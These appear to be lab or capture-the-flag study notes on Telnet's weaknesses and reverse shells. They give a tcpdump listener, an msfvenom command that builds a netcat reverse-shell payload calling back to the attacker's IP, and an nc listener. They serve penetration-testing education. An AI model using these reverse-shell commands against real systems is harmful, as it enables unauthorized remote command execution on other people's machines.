### Telnet
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.  
The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

You can connect to a telnet server with the following syntax: `telnet [ip] [port]`

#### Exploiting telnet
It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems.


**What is a Reverse Shell?**

**![](https://i.imgur.com/EUC7VS6.png)**

A **"shell"** can simply be described as a piece of code or program which can be used to gain code or command execution on a device.
A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.
The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

- `sudo tcpdump ip proto \\icmp -i tun0` This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

#### msfvenom
It is a command-line tool within the Metasploit Framework used for generating payloads. These payloads are often used in penetration testing, exploit development, and creating malware for various security-related purposes.
  
Generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. Here's the syntax:  
		`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format


The command `nc -lvp 4444` starts a Netcat listener on port 4444, listening for incoming connections.
- `-l`: Tells Netcat to listen for incoming connections.
- `-v`: Enables verbose mode, which displays more information about incoming connections.
- `-p 4444`: Specifies the port number to listen on (in this case, port 4444).
